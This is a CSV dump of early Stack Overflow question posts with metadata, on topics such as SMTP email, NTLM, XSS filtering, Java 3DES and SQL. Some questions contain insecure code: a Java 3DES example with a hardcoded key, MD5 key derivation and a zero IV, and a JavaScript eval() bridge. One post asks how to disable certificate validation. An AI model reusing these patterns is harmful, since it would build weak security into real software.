Id,PostTypeId,AcceptedAnswerId,ParentId,CreationDate,DeletionDate,Score,ViewCount,Body,OwnerUserId,OwnerDisplayName,LastEditorUserId,LastEditorDisplayName,LastEditDate,LastActivityDate,Title,Tags,AnswerCount,CommentCount,FavoriteCount,ClosedDate,CommunityOwnedDate
"32260","1","32336","","2008-08-28 13:28:38","","839","516687","<p>Instead of relying on my host to send email, I was thinking of sending the email messages using my Gmail account. The emails are personalized emails to the bands I play on my show. Is it possible to do?</p>
","2535","Mike Wills","2349082","","2017-11-16 01:50:52","2019-09-01 12:15:52","Sending email in .NET through Gmail","<c#><.net><email><smtp><gmail>","23","11","357","",""
"31931","1","31939","","2008-08-28 09:50:48","","17","10636","<p>I need to decrement a Javascript date by 1 day, so that it rolls back across months/years correctly.  That is, if I have a date of 'Today', I want to get the date for 'Yesterday'.</p>

<p>It always seems to take more code than necessary when I do this, so I'm wondering if there's any simpler way.  </p>

<p>What's the simplest way of doing this?</p>

<p>[Edit: Just to avoid confusion in an answer below, this is a <strong>JavaScript</strong> question, not a Java one.]</p>
","916","ChrisThomas123","9816472","","2018-07-29 07:43:56","2018-07-29 07:43:56","What's the simplest way to decrement a date in Javascript by 1 day?","<javascript><browser><date>","7","1","2","",""
"31790","1","31798","","2008-08-28 07:28:17","","10","16586","<p>How many ServiceContracts can a WCF service have?</p>

<p>Specifically, since a ServiceContract is an attribute to an interface, how many interfaces can I code into one WCF web service? Is it a one-to-one?</p>

<p>Does it make sense to separate the contracts across multiple web services?</p>
","831","jdiaz","63550","jdiaz","2012-01-25 21:28:51","2012-01-25 21:28:51","How many ServiceContracts can a WCF service have?","<wcf><web-services>","4","0","4","",""
"29399","1","29471","","2008-08-27 02:44:58","","25","5828","<p>I'm working on building a development tool that is written in JavaScript.</p>

<p>This will not be an open source project and will be sold (hopefully) as a commercial product.</p>

<p>I'm looking for the best way to protect my investment. Is using an obfuscator (code mangler) enough to reasonably secure the code?</p>

<p>Are there other alternatives that I am not aware of?</p>

<p>(I'm not sure if obfuscator is the right word, it's one of the apps that takes your code and makes it very unreadable.)</p>
","2490","Markus","496830","Sean","2011-03-15 21:58:06","2012-03-07 12:43:43","Is using an obfuscator enough to secure my JavaScript code?","<javascript><obfuscation>","9","0","15","",""
"28941","1","28955","","2008-08-26 19:42:47","","2","513","<p>Here is the scenario:</p>

<p>I'm writing an app that will watch for any changes in a specific directory. This directory will be flooded with thousands of files a minute each with an ""almost"" unique GUID. The file format is this:</p>

<p>GUID.dat where GUID == xxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
(the internal contents aren't relevant, but it's just text data)</p>

<p>My app will be a form that has one single text box that shows all the files that are being added and deleted in real time. Every time a new file comes in I have to update the textbox with this file, BUT I must first make sure that this semi-unique GUID is really unique, if it is, update the textbox with this new file.</p>

<p>When a file is removed from that directory, make sure it exists, then delete it, update textbox accordingly.</p>

<p>The problem is that I've been using the .NET filewatcher and it seems that there is an internal buffer that gets blown up every time the (buffersize + 1)-th file comes in. I also tried to keep an internal List in my app, and just add every single file that comes in, but do the unique-GUID check later, but no dice.</p>
","750","eviljack","1836618","Rob Cooper","2017-08-04 14:41:55","2017-08-04 14:41:55","Best architecture for handling file system changes?","<.net><architecture><concurrency><filesystemwatcher>","2","0","","",""
"28877","1","","","2008-08-26 19:13:14","","16","13473","<p>I have a sproc that puts 750K records into a temp table through a query as one of its first actions.  If I create indexes on the temp table before filling it, the item takes about twice as long to run compared to when I index after filling the table.  (The index is an integer in a single column, the table being indexed is just two columns each a single integer.)</p>

<p>This seems a little off to me, but then I don't have the firmest understanding of what goes on under the hood.  Does anyone have an answer for this? </p>
","1327","Dan","1797","mk","2008-08-26 21:51:50","2011-03-25 21:26:54","Why does SQL Server work faster when you index a table after filling it?","<sql-server><performance><indexing>","9","0","","",""
"28599","1","28717","","2008-08-26 16:57:52","","10","14415","<p>I want to do what myopenid does -- once you've logged, you can click a button that generates you an SSL certificate; the browser then downloads this certificate and stores it.  When you later go back to yourid.myopenid.com, your browser can use its stored certificate for authentication so you don't ever need a password.</p>

<p>So my questions is what is required to get this working?  How do I generate certificates?  How do I validate them once they're presented back to me?</p>

<p>My stack is Rails on Apache using Passenger, but I'm not too particular.</p>
","1190","Gaius","","","","2012-10-30 17:18:47","How do I support SSL Client Certificate authentication?","<ruby-on-rails><apache><ssl>","5","0","3","",""
"28380","1","3869611","","2008-08-26 15:30:38","","53","71911","<p>Has anybody managed to get the Android Emulator working behind a proxy which requires authentication?</p>

<p>I've tried setting the -http-proxy argument to </p>

<pre><code>http://DOMAIN/USERNAME:PASSWORD@IP:PORT
</code></pre>

<p>but am having no success. </p>

<p>I've tried following the docs to no avail. I've also tried the <code>-verbose-proxy</code> setting but this no longer seems to exist.</p>

<p>Any pointers?</p>
","1281","Rich Lawrence","750613","","2012-06-30 11:22:22","2018-04-27 13:02:38","Proxy which requires authentication with Android Emulator","<android><authentication><proxy>","16","2","11","",""
"27928","1","27943","","2008-08-26 12:50:45","","824","698534","<p>How do I calculate the distance between two points specified by latitude and longitude?</p>

<p>For clarification, I'd like the distance in kilometers; the points use the WGS84 system and I'd like to understand the relative accuracies of the approaches available.</p>
","1456","Robin M","2137255","","2017-09-11 17:15:37","2019-07-14 22:46:02","Calculate distance between two latitude-longitude points? (Haversine formula)","<algorithm><math><maps><latitude-longitude><haversine>","36","5","466","",""
"27745","1","27755","","2008-08-26 11:01:37","","126","205883","<p>Given the URL (single line):<br>
<a href=""http://test.example.com/dir/subdir/file.html"" rel=""noreferrer"">http://test.example.com/dir/subdir/file.html</a></p>

<p>How can I extract the following parts using regular expressions:</p>

<ol>
<li>The Subdomain (test)</li>
<li>The Domain (example.com)</li>
<li>The path without the file (/dir/subdir/)</li>
<li>The file (file.html)</li>
<li>The path with the file (/dir/subdir/file.html)</li>
<li>The URL without the path (<a href=""http://test.example.com"" rel=""noreferrer"">http://test.example.com</a>)</li>
<li>(add any other that you think would be useful)</li>
</ol>

<p>The regex should work correctly even if I enter the following URL:  </p>

<pre><code>http://example.example.com/example/example/example.html
</code></pre>
","2644","pek","1788806","travis","2019-01-13 11:34:20","2019-01-13 11:34:20","Getting parts of a URL (Regex)","<regex><language-agnostic><url>","24","4","95","",""
"24886","1","24887","","2008-08-24 06:48:23","","437","94472","<p>Is there a performance difference between <code>i++</code> and <code>++i</code> if the resulting value is not used?</p>
","116","Mark Harrison","116","Mark Harrison","2015-02-08 22:06:36","2019-08-15 22:45:11","Is there a performance difference between i++ and ++i in C?","<c><performance><optimization><post-increment><pre-increment>","14","2","147","",""
"24723","1","535022","","2008-08-24 00:21:10","","22","57750","<p>Jeff actually posted about this in <a href=""http://refactormycode.com/codes/333-sanitize-html"" rel=""noreferrer"">Sanitize HTML</a>. But his example is in C# and I'm actually more interested in a Java version. Does anyone have a better version for Java? Is his example good enough to just convert directly from C# to Java? </p>

<p>[Update] I have put a bounty on this question because SO wasn't as popular when I asked the question as it is today (*). As for anything related to security, the more people look into it, the better it is! </p>

<p>(*) In fact, I think it was still in closed beta</p>
","1406","Eldimo","15168","Eldimo","2017-05-14 05:52:50","2018-12-22 20:57:27","Best regex to catch XSS (Cross-site Scripting) attack (in Java)?","<java><html><regex><xss>","8","1","20","",""
"24241","1","24254","","2008-08-23 13:57:06","","13","34869","<p>Can you use windows hooks or other methods to do code injection with c#? I've seen lots of things about code injection but all of them are done in C/C++. I don't know either of those languages and have a really hard time translating. Does anyone have any ideas on how to do this?</p>
","2128","The.Anti.9","503969","Chris Fournier","2011-03-31 04:54:08","2018-04-01 04:20:56","Code Injection With C#","<c#><code-injection>","4","0","15","",""
"22676","1","22682","","2008-08-22 15:34:13","","799","979398","<p>I have a small utility that I use to download a MP3 from a website on a schedule and then builds/updates a podcast XML file which I've obviously added to iTunes.</p>

<p>The text processing that creates/updates the XML file is written in Python. I use wget inside a Windows <code>.bat</code> file to download the actual MP3 however. I would prefer to have the entire utility written in Python though.</p>

<p>I struggled though to find a way to actually down load the file in Python, thus why I resorted to <code>wget</code>.</p>

<p>So, how do I download the file using Python?</p>
","2109","Owen","3474956","Prakash","2017-03-31 05:11:20","2019-05-03 13:00:17","How do I download a file over HTTP using Python?","<python><http><urllib>","22","2","330","",""
"22135","1","","","2008-08-22 11:55:45","","7","43044","<p>I am trying to implement NTLM authentication on one of our internal sites and everything is working. The one piece of the puzzle I do not have is how to take the information from NTLM and authenticate with Active Directory.</p>

<p>There is a <a href=""http://www.innovation.ch/personal/ronald/ntlm.html"" rel=""nofollow noreferrer"">good description of NTLM</a> and the <a href=""http://us1.samba.org/samba/docs/man/Samba-Developers-Guide/pwencrypt.html"" rel=""nofollow noreferrer"">encryption used for the passwords</a>, which I used to implement this, but I am not sure of how to verify if the user's password is valid.</p>

<p>I am using ColdFusion but a solution to this problem can be in any language (Java, Python, PHP, etc).</p>

<p>Edit:</p>

<p>I am using ColdFusion on Redhat Enterprise Linux. Unfortunately we cannot use IIS to manage this and instead have to write or use a 3rd party tool for this.</p>

<hr>

<p><strong>Update</strong> - <em>I got this working and here is what I did</em></p>

<p>I went with the <a href=""http://jcifs.samba.org/"" rel=""nofollow noreferrer"">JCIFS library from samba.org.</a></p>

<blockquote>
  <p>Note that the method below will only work with NTLMv1 and <strong>DOES NOT</strong> work with NTLMv2. If you are unable to use NTLMv1 you can try <a href=""http://www.ioplex.com/jespa.html"" rel=""nofollow noreferrer"">Jespa</a>, which supports NTLMv2 but is not open source, or you can use <a href=""http://spnego.sourceforge.net"" rel=""nofollow noreferrer"">Kerberos/SPNEGO.</a></p>
</blockquote>

<p>Here is my web.xml:</p>

<pre><code>&lt;web-app&gt;
    &lt;display-name&gt;Ntlm&lt;/display-name&gt;

    &lt;filter&gt;
        &lt;filter-name&gt;NtlmHttpFilter&lt;/filter-name&gt;
        &lt;filter-class&gt;jcifs.http.NtlmHttpFilter&lt;/filter-class&gt;

        &lt;init-param&gt;
            &lt;param-name&gt;jcifs.http.domainController&lt;/param-name&gt;
            &lt;param-value&gt;dc01.corp.example.com&lt;/param-value&gt;
        &lt;/init-param&gt;
        &lt;init-param&gt;
            &lt;param-name&gt;jcifs.smb.client.domain&lt;/param-name&gt;
            &lt;param-value&gt;CORP.EXAMPLE.COM&lt;/param-value&gt;
        &lt;/init-param&gt;
    &lt;/filter&gt;

    &lt;filter-mapping&gt;
        &lt;filter-name&gt;NtlmHttpFilter&lt;/filter-name&gt;
        &lt;url-pattern&gt;/admin/*&lt;/url-pattern&gt;
    &lt;/filter-mapping&gt;
&lt;/web-app&gt;
</code></pre>

<p>Now all URLs matching <code>/admin/*</code> will require NTLM authentication.</p>
","309844","Jon Works","850882","Rich B","2012-01-11 19:00:08","2013-11-08 13:30:03","How do I use NTLM authentication with Active Directory","<http><authentication><coldfusion><active-directory><ntlm>","7","0","10","","2010-06-28 13:53:48"
"21908","1","","","2008-08-22 06:59:56","","39","61571","<p>I'm working on a web application that needs to prints silently -- that is without user involvement.  What's the best way to accomplish this?  It doesn't like it can be done with strictly with Javascript, nor Flash and/or AIR.  The closest I've seen involves a Java applet.</p>

<p>I can understand why it would a Bad Idea for just any website to be able to do this.  This specific instance is for an internal application, and it's perfectly acceptable if the user needs to add the URL to a trusted site list, install an addon, etc.</p>
","181","","1477667","","2015-01-12 05:08:48","2019-08-03 01:43:48","""Silent"" Printing in a Web Application","<web-services><printing>","11","4","36","",""
"21640","1","22361","","2008-08-22 02:18:28","","211","146525","<p>Is there a simple way in .NET to quickly get the current protocol, host, and port? For example, if I'm on the following URL:</p>

<p><code>http://www.mywebsite.com:80/pages/page1.aspx</code></p>

<p>I need to return:</p>

<p><code>http://www.mywebsite.com:80</code></p>

<p>I know I can use <code>Request.Url.AbsoluteUri</code> to get the complete URL, and I know I can use <code>Request.Url.Authority</code> to get the host and port, but I'm not sure of the best way to get the protocol without parsing out the URL string.</p>

<p>Any suggestions?</p>
","2076253","Jeremy Kratz","133","","2018-07-19 08:57:52","2018-07-19 08:57:52",".NET - Get protocol, host, and port","<.net><asp.net><url><uri><authority>","7","2","36","",""
"21078","1","21093","","2008-08-21 20:27:15","","264","191933","<p>What's the most efficient way to concatenate strings?</p>
","2358","jimmij","6651","Andy Lester","2016-09-18 00:41:19","2019-04-29 06:00:23","Most efficient way to concatenate strings?","<c#><.net><string><optimization>","17","6","82","",""
"20762","1","20777","","2008-08-21 18:47:49","","74","90512","<p>Is there any easy/general way to clean an XML based data source prior to using it in an XmlReader so that I can gracefully consume XML data that is non-conformant to the hexadecimal character restrictions placed on XML?</p>

<p>Note: </p>

<ul>
<li>The solution needs to handle XML
data sources that use character
encodings other than UTF-8, e.g. by
specifying the character encoding at
the XML document declaration. Not
mangling the character encoding of
the source while stripping invalid
hexadecimal characters has been a
major sticking point.</li>
<li>The removal of invalid hexadecimal characters should only remove hexadecimal encoded values, as you can often find href values in data that happens to contains a string that would be a string match for a hexadecimal character.</li>
</ul>

<p><em>Background:</em></p>

<p>I need to consume an XML-based data source that conforms to a specific format (think Atom or RSS feeds), but want to be able to consume data sources that have been published which contain invalid hexadecimal characters per the XML specification.</p>

<p>In .NET if you have a Stream that represents the XML data source, and then attempt to parse it using an XmlReader and/or XPathDocument, an exception is raised due to the inclusion of invalid hexadecimal characters in the XML data. My current attempt to resolve this issue is to parse the Stream as a string and use a regular expression to remove and/or replace the invalid hexadecimal characters, but I am looking for a more performant solution.</p>
","2029","Oppositional","204690","Gaius","2013-10-31 13:33:10","2019-01-27 16:22:24","How do you remove invalid hexadecimal characters from an XML-based data source prior to constructing an XmlReader or XPathDocument that uses the data?","<c#><xml><validation><encoding>","14","0","26","",""
"20510","1","20645","","2008-08-21 16:55:09","","4","3024","<p>I have a flex application that needs the ability to generate and execute JavaScript. When I say this, I mean I need to execute raw JavaScript that I create in my Flex application (not just an existing JavaScript method)</p>

<p>I am currently doing this by exposing the following JavaScript method:</p>

<pre><code>function doScript(js){ eval(js);}
</code></pre>

<p>I can then do something like this in Flex (note: I am doing something more substantial then an alert box in the real Flex app):</p>

<pre><code>ExternalInterface.call(""doScript"",""alert('foo'));
</code></pre>

<p>My question is does this impose any security risk, I am assuming it's not since the Flex and JasvaScript all run client side...</p>

<p>Is there a better way to do this?</p>
","1638","mmattax","","","","2016-11-11 17:31:19","Executing JavaScript from Flex: Is this javascript function dangerous?","<javascript><apache-flex><exploit>","6","0","","",""
"20286","1","20293","","2008-08-21 15:42:20","","2","212","<p>As a part of the signup process for my online application, I'm thinking of tracking the source and/or search keywords used to get to my site. This would allow me to see what advertising is working and from where with a somewhat finer grain than Google Analytics would.</p>

<p>I assume I could set some kind of cookie with this information when people get to my site, but I'm not sure how I would go about getting it. Is it even possible?</p>

<p>I'm using Rails, but a language-independent solution (or even just pointers to where to find this information) would be appreciated!</p>
","722","Tim Sullivan","2432317","","2013-12-02 13:05:05","2013-12-02 13:05:05","Associating source and search keywords with account creation","<ruby-on-rails><cookies><seo>","1","0","","",""
"20227","1","20670","","2008-08-21 15:25:22","","67","159663","<p>Every method I write to encode a string in Java using 3DES can't be decrypted back to the original string.  Does anyone have a simple code snippet that can just encode and then decode the string back to the original string?</p>

<p>I know I'm making a very silly mistake somewhere in this code. Here's what I've been working with so far:</p>

<p>** note, I am not returning the BASE64 text from the encrypt method, and I am not base64 un-encoding in the decrypt method because I was trying to see if I was making a mistake in the BASE64 part of the puzzle.</p>

<pre><code>public class TripleDESTest {

    public static void main(String[] args) {

        String text = ""kyle boon"";

        byte[] codedtext = new TripleDESTest().encrypt(text);
        String decodedtext  = new TripleDESTest().decrypt(codedtext);

        System.out.println(codedtext);
        System.out.println(decodedtext);
    }

    public byte[] encrypt(String message) {
        try {
            final MessageDigest md = MessageDigest.getInstance(""md5"");
            final byte[] digestOfPassword = md.digest(""HG58YZ3CR9"".getBytes(""utf-8""));
            final byte[] keyBytes = Arrays.copyOf(digestOfPassword, 24);
            for (int j = 0,  k = 16; j &lt; 8;)
            {
                keyBytes[k++] = keyBytes[j++];
            }

            final SecretKey key = new SecretKeySpec(keyBytes, ""DESede"");
            final IvParameterSpec iv = new IvParameterSpec(new byte[8]);
            final Cipher cipher = Cipher.getInstance(""DESede/CBC/PKCS5Padding"");
            cipher.init(Cipher.ENCRYPT_MODE, key, iv);

            final byte[] plainTextBytes = message.getBytes(""utf-8"");
            final byte[] cipherText = cipher.doFinal(plainTextBytes);
            final String encodedCipherText = new sun.misc.BASE64Encoder().encode(cipherText);

            return cipherText;    
        }
        catch (java.security.InvalidAlgorithmParameterException e) { System.out.println(""Invalid Algorithm""); }
        catch (javax.crypto.NoSuchPaddingException e) { System.out.println(""No Such Padding""); }
        catch (java.security.NoSuchAlgorithmException e) { System.out.println(""No Such Algorithm""); }
        catch (java.security.InvalidKeyException e) { System.out.println(""Invalid Key""); }
        catch (BadPaddingException e) { System.out.println(""Invalid Key"");}
        catch (IllegalBlockSizeException e) { System.out.println(""Invalid Key"");}
        catch (UnsupportedEncodingException e) { System.out.println(""Invalid Key"");}

        return null;
    }

    public String decrypt(byte[] message) {
        try
        {
            final MessageDigest md = MessageDigest.getInstance(""md5"");
            final byte[] digestOfPassword = md.digest(""HG58YZ3CR9"".getBytes(""utf-8""));
            final byte[] keyBytes = Arrays.copyOf(digestOfPassword, 24);
            for (int j = 0,  k = 16; j &lt; 8;)
            {
                keyBytes[k++] = keyBytes[j++];
            }

            final SecretKey key = new SecretKeySpec(keyBytes, ""DESede"");
            final IvParameterSpec iv = new IvParameterSpec(new byte[8]);
            final Cipher decipher = Cipher.getInstance(""DESede/CBC/PKCS5Padding"");
            decipher.init(Cipher.DECRYPT_MODE, key, iv);

            //final byte[] encData = new sun.misc.BASE64Decoder().decodeBuffer(message);
            final byte[] plainText = decipher.doFinal(message);

            return plainText.toString();            
        }
        catch (java.security.InvalidAlgorithmParameterException e) { System.out.println(""Invalid Algorithm""); }
        catch (javax.crypto.NoSuchPaddingException e) { System.out.println(""No Such Padding""); }
        catch (java.security.NoSuchAlgorithmException e) { System.out.println(""No Such Algorithm""); }
        catch (java.security.InvalidKeyException e) { System.out.println(""Invalid Key""); }
        catch (BadPaddingException e) { System.out.println(""Invalid Key"");}
        catch (IllegalBlockSizeException e) { System.out.println(""Invalid Key"");}
        catch (UnsupportedEncodingException e) { System.out.println(""Invalid Key"");}     
        catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        return null;
    }
}
</code></pre>
","1486","Kyle Boon","608639","Kyle Boon","2017-07-01 01:10:44","2017-07-01 01:10:44","How do I use 3DES encryption/decryption in Java?","<java><encryption><3des>","5","0","43","",""
"20148","1","","","2008-08-21 14:50:52","","850","289032","<p>I'm working on a projects which involves a lot of database writes, I'd say (<em>70% inserts and 30% reads</em>).  This ratio would also include updates which I consider to be one read and one write.  The reads can be dirty (e.g. I don't need 100% accurate information at the time of read).<br>
The task in question will be doing over 1 million database transactions an hour.  </p>

<p>I've read a bunch of stuff on the web about the differences between MyISAM and InnoDB, and MyISAM seems like the obvious choice to me for the particular database/tables that I'll be using for this task.  From what I seem to be reading, InnoDB is good if transactions are needed since row level locking is supported.</p>

<p>Does anybody have any experience with this type of load (or higher)?  Is MyISAM the way to go?</p>
","2013","","19679","sparkes","2013-02-26 21:30:14","2019-03-14 08:47:08","MyISAM versus InnoDB","<mysql><database><performance><innodb><myisam>","25","5","380","2018-06-09 19:51:56",""
"20088","1","20114","","2008-08-21 14:31:50","","70","212799","<p>I am maintaining a few web applications. The development and qa environments use invalid/outdated ssl-certificates.</p>

<p>Although it is generally a good thing, that Firefox makes me click like a dozen times to accept the certificate, this is pretty annoying.</p>

<p>Is there a configuration-parameter to make Firefox (and possibly IE too) accept any ssl-certificate?</p>

<p>EDIT: I have accepted the solution, that worked. But thanks to all the people that have advised to use self-signed certificates. I am totally aware, that the accepted solution leaves me with a <strong>gaping security hole</strong>. Nonetheless I am to lazy to change the certificate for all the applications and all the environments...</p>

<p>But I also advice anybody strongly to leave validation enabled!</p>
","1870","Mo","1870","Mo","2011-11-02 11:01:37","2015-08-24 17:56:14","Is there a way to make Firefox ignore invalid ssl-certificates?","<firefox><ssl>","9","1","12","",""
"19995","1","20004","","2008-08-21 14:04:55","","132","68105","<p>Of course I am aware of Ajax, but the problem with Ajax is that the browser should poll the server frequently to find whether there is new data. This increases server load.</p>

<p>Is there any better method (even using Ajax) other than polling the server frequently?</p>
","184","Niyaz","11343","","2012-05-09 05:37:25","2016-08-06 23:08:01","Is there some way to PUSH data from web server to browser?","<ajax><webserver><comet>","18","3","48","",""
"19412","1","19419","","2008-08-21 06:28:49","","488","408223","<p>How can I request a random row (or as close to truly random as is possible) in pure SQL?</p>
","473","sverrejoh","347414","Yaakov Ellis","2014-07-07 13:26:48","2018-07-06 07:59:29","How to request a random row in SQL?","<sql><random>","28","4","165","",""
"18943","1","","","2008-08-20 21:56:21","","13","7667","<p>Typically in a large network a computer needs to operate behind an authenticated proxy - any connections to the outside world require a username/password which is often the password a user uses to log into email, workstation etc.</p>

<p>This means having to put the network password in the <code>apt.conf</code> file as well as typically the <code>http_proxy, ftp_proxy</code> and <code>https_proxy</code> environment variables defined in <code>~/.profile</code></p>

<p>I realise that with <code>apt.conf</code> that you could set <code>chmod 600</code> (which it isn't by default on Ubuntu/Debian!) but on our system there are people who need root priveleges .</p>

<p>I also realise that it is technically impossible to secure a password from someone who has root access, however I was wondering if there was a way of <i>obscuring</i> the password to prevent accidental discovery. Windows operates with users as admins yet somehow stores network passwords (probably stored deep in the registry obscured in some way) so that in typical use you won't stumble across it in plain text</p>

<p>I only ask since the other day, I entirely by accident discovered somebody elses password in this way when comparing configuration files across systems.</p>

<p>@monjardin - Public key authentication is not an alternative on this network I'm afraid. Plus I doubt it is supported amongst the majority of commandline tools.</p>

<p>@Neall - I don't mind the other users having web access, they can use my credentials to access the web, I just don't want them to happen across my password in plain text.</p>
","199","Brendan","199","Brendan","2008-08-24 00:22:46","2017-05-31 13:38:18","Obscuring network proxy password in plain text files on Linux/UNIX-likes","<linux><security><unix><proxy><apt>","9","0","6","",""
"18783","1","","","2008-08-20 20:45:15","","126","37866","<p>When you have a query or stored procedure that needs performance tuning, what are some of the first things you try?</p>
","357","Terrapin","2357766","AJ","2014-08-27 11:44:18","2015-01-22 15:39:26","Favourite performance tuning tricks","<sql><sql-server><database><performance>","29","2","179","2011-11-28 01:23:55","2009-08-05 10:55:52"
"18676","1","18680","","2008-08-20 19:54:00","","56","292835","<p>I need to generate a random integer between 1 and n (where n is a positive whole number) to use for a unit test. I don't need something overly complicated to ensure true randomness - just an old-fashioned random number.</p>

<p>How would I do that?</p>
","225","brendan","63550","","2015-05-16 22:05:29","2016-10-09 21:12:23","Random integer in VB.NET","<vb.net><random>","11","0","11","",""
"18524","1","18529","","2008-08-20 18:29:48","","95","179131","<p>I have a list of integers, <code>List&lt;Integer&gt;</code> and I'd like to convert all the integer objects into Strings, thus finishing up with a new <code>List&lt;String&gt;</code>.</p>

<p>Naturally, I could create a new <code>List&lt;String&gt;</code> and loop through the list calling <code>String.valueOf()</code> for each integer, but I was wondering if there was a better (read: <em>more automatic</em>) way of doing it?</p>
","916","ChrisThomas123","6074376","ChrisThomas123","2017-11-02 22:27:53","2019-06-19 11:11:06","Converting List<Integer> to List<String>","<java><string><collections><integer>","20","0","23","",""
"18082","1","1830844","","2008-08-20 14:21:13","","2302","1445316","<p>What's the cleanest, most effective way to validate decimal numbers in JavaScript?</p>

<p>Bonus points for:</p>

<ol>
<li>Clarity. Solution should be clean and simple.</li>
<li>Cross-platform.</li>
</ol>

<p>Test cases:</p>

<pre><code>01. IsNumeric('-1')      =&gt; true
02. IsNumeric('-1.5')    =&gt; true
03. IsNumeric('0')       =&gt; true
04. IsNumeric('0.42')    =&gt; true
05. IsNumeric('.42')     =&gt; true
06. IsNumeric('99,999')  =&gt; false
07. IsNumeric('0x89f')   =&gt; false
08. IsNumeric('#abcdef') =&gt; false
09. IsNumeric('1.2.3')   =&gt; false
10. IsNumeric('')        =&gt; false
11. IsNumeric('blah')    =&gt; false
</code></pre>
","29","mharen","2571493","","2016-12-07 03:57:31","2019-02-10 17:11:08","Validate decimal numbers in JavaScript - IsNumeric()","<javascript><validation><numbers>","48","10","730","","2013-07-09 23:10:44"
"18034","1","18062","","2008-08-20 14:01:43","","22","11094","<p>How do I create a self signed SSL certificate for an Apache Server to use while testing a web app?</p>
","1310","ScArcher2","","","","2019-08-21 22:57:35","How do I create a self signed SSL certificate to use while testing a web app","<apache><ssl>","4","0","8","",""
"17373","1","27791","","2008-08-20 03:20:02","","11","17059","<p>How do I open the default mail program with a Subject and Body in a cross-platform way?</p>

<p>Unfortunately, this is for a a client app written in Java, not a website.</p>

<p>I would like this to work in a cross-platform way (which means Windows and Mac, sorry Linux). I am happy to execute a VBScript in Windows, or AppleScript in OS X. But I have no idea what those scripts should contain. I would love to execute the user's default program vs. just searching for Outlook or whatever.</p>

<p>In OS X, I have tried executing the command:</p>

<pre><code>open mailto:?subject=MySubject&amp;body=TheBody
</code></pre>

<p>URL escaping is needed to replace spaces with <code>%20</code>.</p>

<p><strong>Updated</strong> On Windows, you have to play all sorts of games to get <code>start</code> to run correctly. Here is the proper Java incantation:</p>

<pre><code>class Win32 extends OS {
    public void email(String subject, String body) throws Exception {
        String cmd = ""cmd.exe /c start \""\"" \"""" + formatMailto(subject, body) + ""\"""";
        Runtime.getRuntime().exec(cmd);
    }
}
</code></pre>
","338","Frank Krueger","338","Frank Krueger","2008-08-26 02:56:18","2013-01-22 03:35:58","How do I open the default mail program with a Subject and Body in a cross-platform way?","<java><windows><macos><email>","9","0","3","",""
"17359","1","9524359","","2008-08-20 02:48:50","","280","632611","<p>I've created a script that runs every night on my Linux server that uses <code>mysqldump</code> to back up each of my MySQL databases to .sql files and packages them together as a compressed .tar file.  The next step I want to accomplish is to send that tar file through email to a remote email server for safekeeping.  I've been able to send the raw script in the body an email by piping the backup text file to <code>mailx</code> like so:</p>

<pre><code>$ cat mysqldbbackup.sql | mailx backup@email.com
</code></pre>

<p><code>cat</code> echoes the backup file's text which is piped into the <code>mailx</code> program with the recipient's email address passed as an argument.</p>

<p>While this accomplishes what I need, I think it could be one step better, <strong>Is there any way, using shell scripts or otherwise, to send the compressed .tar file to an outgoing email message as an <em>attachment</em>?</strong>  This would beat having to deal with very long email messages which contain header data and often have word-wrapping issues etc.</p>
","1339","Kit Roed","792066","Kit Roed","2016-12-14 18:56:39","2019-06-12 11:43:54","How do I send a file as an email attachment using Linux command line?","<linux><email><command-line>","26","4","131","",""
"17333","1","","","2008-08-20 02:09:33","","488","378172","<p>What would be the most efficient way to compare two <code>double</code> or two <code>float</code> values?</p>

<p>Simply doing this is not correct:</p>

<pre><code>bool CompareDoubles1 (double A, double B)
{
   return A == B;
}
</code></pre>

<p>But something like:</p>

<pre><code>bool CompareDoubles2 (double A, double B) 
{
   diff = A - B;
   return (diff &lt; EPSILON) &amp;&amp; (-diff &lt; EPSILON);
}
</code></pre>

<p>Seems to waste processing.</p>

<p>Does anyone know a smarter float comparer?</p>
","2057","Alex","1459996","Nickolay","2016-12-21 03:17:41","2019-08-01 19:33:40","What is the most effective way for float and double comparison?","<c++><algorithm><optimization><floating-point>","28","7","283","",""
